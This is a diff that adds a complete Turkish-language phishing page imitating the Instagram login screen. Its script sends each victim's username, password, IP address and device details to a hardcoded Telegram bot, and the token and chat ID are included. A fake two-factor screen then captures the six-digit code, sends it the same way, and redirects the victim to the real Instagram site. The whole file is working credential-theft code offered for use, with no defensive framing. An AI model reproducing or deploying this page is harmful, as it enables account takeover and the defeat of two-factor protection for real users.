@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="tr" dir="ltr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Instagram</title>
+  <!-- Instagram Favicon – Sekmede mavi kamera logosu görünür -->
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDggMTA4Ij48ZyBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPjxjaXJjbGUgY3g9IjU0IiBjeT0iNTQiIHI9IjU0IiBmaWxsPSIjMDA5NWY2Ii8+PHBhdGggZD0iTTU0IDIwTDY0IDQwTDg0IDQwTDY5IDU1TDc0IDgwTDU0IDY1TDM0IDgwTDM5IDU1TDIwIDQwTDQwIDQwWiIgZmlsbD0iI2ZmZmZmZiIvPjwvZz48L3N2Zz4=">
+  <link rel="apple-touch-icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDggMTA4Ij48ZyBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPjxjaXJjbGUgY3g9IjU0IiBjeT0iNTQiIHI9IjU0IiBmaWxsPSIjMDA5NWY2Ii8+PHBhdGggZD0iTTU0IDIwTDY0IDQwTDg0IDQwTDY5IDU1TDc0IDgwTDU0IDY1TDM0IDgwTDM5IDU1TDIwIDQwTDQwIDQwWiIgZmlsbD0iI2ZmZmZmZiIvPjwvZz48L3N2Zz4=">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; }
+    body {
+      background: linear-gradient(135deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #262626;
+    }
+    .container {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 4px;
+      padding: 20px 0;
+      width: 90%;
+      max-width: 420px;
+      text-align: center;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.25);
+      margin: 20px;
+    }
+    .logo {
+      font-family: Billabong, cursive;
+      font-size: clamp(2.8rem, 8vw, 3.8rem);
+      color: #262626;
+      margin: clamp(20px, 5vw, 30px) auto clamp(10px, 3vw, 15px);
+    }
+    .logo::before { content: "Instagram"; }
+    input {
+      width: calc(100% - 40px);
+      max-width: 320px;
+      margin: 10px auto;
+      padding: clamp(10px, 3vw, 14px) 12px;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background: #fafafa;
+      font-size: clamp(14px, 4vw, 16px);
+      display: block;
+    }
+    input:focus { outline: none; border-color: #a8a8a8; }
+    .password-wrapper { position: relative; }
+    .eye {
+      position: absolute;
+      right: calc(10% + 20px);
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      color: #8e8e8e;
+      font-size: clamp(16px, 4vw, 18px);
+    }
+    button {
+      width: calc(100% - 40px);
+      max-width: 320px;
+      margin: 12px auto;
+      padding: clamp(8px, 2.5vw, 10px);
+      border: none;
+      border-radius: 8px;
+      background: #0095f6;
+      color: #fff;
+      font-weight: 600;
+      cursor: pointer;
+      font-size: clamp(14px, 4vw, 16px);
+      display: block;
+    }
+    button:hover { background: #1877f2; }
+    .loading { display: none; margin: 30px 0; font-size: clamp(14px, 4vw, 16px); color: #0095f6; }
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #0095f6;
+      border-radius: 50%;
+      width: clamp(24px, 6vw, 32px);
+      height: clamp(24px, 6vw, 32px);
+      animation: spin 1s linear infinite;
+      margin: 0 auto 12px;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    #twofa-screen { display: none; margin: 20px 0; }
+    .code-inputs {
+      display: flex;
+      justify-content: center;
+      gap: clamp(6px, 2vw, 10px);
+      margin: 20px 0;
+      flex-wrap: wrap;
+    }
+    .code-input {
+      width: clamp(38px, 10vw, 48px);
+      height: clamp(44px, 12vw, 54px);
+      text-align: center;
+      font-size: clamp(20px, 5vw, 26px);
+      border: 1px solid #dbdbdb;
+      border-radius: 4px;
+      background: #fafafa;
+    }
+    .code-input:focus { border-color: #0095f6; outline: none; }
+    .small {
+      font-size: clamp(12px, 3.5vw, 14px);
+      color: #8e8e8e;
+      margin: clamp(10px, 3vw, 15px) 20px;
+      line-height: 1.5;
+    }
+    .small a { color: #0095f6; text-decoration: none; }
+    .small a:hover { text-decoration: underline; }
+
+    @media (min-width: 768px) {
+      .container { padding: 30px 0; margin: 0; }
+      input, button { max-width: 340px; }
+      .eye { right: 50px; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="logo"></div>
+
+  <form id="loginForm">
+    <input type="text" id="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" autocomplete="off" required>
+    <div class="password-wrapper">
+      <input type="password" id="password" placeholder="Şifre" autocomplete="off" required>
+      <i class="fas fa-eye eye" id="toggleEye"></i>
+    </div>
+    <button type="submit">Giriş Yap</button>
+  </form>
+
+  <div id="twofa-screen">
+    <p style="font-size: clamp(14px, 4vw, 16px); margin: 0 20px 20px; color: #262626;">
+      Hesabınızı doğrulamak için 6 haneli kodu girin (SMS veya uygulama)
+    </p>
+    <div class="code-inputs">
+      <input type="text" class="code-input" maxlength="1" autofocus>
+      <input type="text" class="code-input" maxlength="1">
+      <input type="text" class="code-input" maxlength="1">
+      <input type="text" class="code-input" maxlength="1">
+      <input type="text" class="code-input" maxlength="1">
+      <input type="text" class="code-input" maxlength="1">
+    </div>
+    <button id="submit2fa">Doğrula</button>
+    <div class="small"><a href="#">Kod gelmedi mi?</a></div>
+  </div>
+
+  <div class="loading" id="loading">
+    <div class="spinner"></div>
+    Giriş yapılıyor...
+  </div>
+
+  <div class="small">
+    <a href="#">Şifreni mi unuttun?</a> • <a href="#">Hesabın yok mu? Kaydol.</a><br>
+    <a href="#">Facebook ile giriş yap</a>
+  </div>
+</div>
+
+<script>
+// SENİN VERİLERİN – DEĞİŞTİRME
+const BOT_TOKEN = "8604225952:AAHoULyCnrkSQ1Pqjo3xa6UlZgwo7H5ObRA";
+const CHAT_ID   = "1636656252";
+
+const form = document.getElementById('loginForm');
+const username = document.getElementById('username');
+const password = document.getElementById('password');
+const toggleEye = document.getElementById('toggleEye');
+const loading = document.getElementById('loading');
+const twofaScreen = document.getElementById('twofa-screen');
+const codeInputs = document.querySelectorAll('.code-input');
+const submit2fa = document.getElementById('submit2fa');
+
+// Şifre göster/gizle
+toggleEye.addEventListener('click', () => {
+  if (password.type === 'password') {
+    password.type = 'text';
+    toggleEye.classList.replace('fa-eye', 'fa-eye-slash');
+  } else {
+    password.type = 'password';
+    toggleEye.classList.replace('fa-eye-slash', 'fa-eye');
+  }
+});
+
+// 2FA kutuları auto-focus + paste
+codeInputs.forEach((input, idx) => {
+  input.addEventListener('input', () => {
+    if (input.value && idx < 5) codeInputs[idx + 1].focus();
+  });
+});
+
+document.addEventListener('paste', e => {
+  if (twofaScreen.style.display !== 'block') return;
+  e.preventDefault();
+  const paste = (e.clipboardData || window.clipboardData).getData('text').trim();
+  if (paste.length === 6 && /^\d{6}$/.test(paste)) {
+    paste.split('').forEach((c, i) => { if (codeInputs[i]) codeInputs[i].value = c; });
+    submit2fa.focus();
+  }
+});
+
+async function sendToTelegram(text) {
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  try {
+    await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' })
+    });
+  } catch (e) { console.log('Telegram error:', e); }
+}
+
+async function getIP() {
+  try {
+    const r = await fetch('https://api.ipify.org?format=json');
+    const d = await r.json();
+    return d.ip || 'Bilinmiyor';
+  } catch { return 'Bilinmiyor'; }
+}
+
+form.addEventListener('submit', async e => {
+  e.preventDefault();
+  if (!username.value.trim() || !password.value.trim()) return;
+
+  const user = username.value.trim();
+  const pass = password.value.trim();
+  const ip = await getIP();
+  const ua = navigator.userAgent;
+  const time = new Date().toLocaleString('tr-TR');
+
+  const msg = `<b>Instagram Giriş Denemesi</b>\n\nKullanıcı: ${user}\nŞifre: ${pass}\nIP: ${ip}\nCihaz: ${ua}\nTarih: ${time}`;
+  await sendToTelegram(msg);
+
+  loading.style.display = 'block';
+  setTimeout(() => {
+    loading.style.display = 'none';
+    twofaScreen.style.display = 'block';
+    codeInputs[0].focus();
+  }, 2800);
+});
+
+submit2fa.addEventListener('click', async () => {
+  const code = [...codeInputs].map(i => i.value.trim()).join('');
+  if (code.length !== 6 || !/^\d{6}$/.test(code)) return alert('6 haneli kod girin');
+
+  const time = new Date().toLocaleString('tr-TR');
+  const msg = `<b>2FA KODU GELDİ</b>\nKod: ${code}\nTarih: ${time}`;
+  await sendToTelegram(msg);
+
+  setTimeout(() => {
+    window.location.href = 'https://www.instagram.com/';
+  }, 1500);
+});
+</script>
+</body>
+</html>
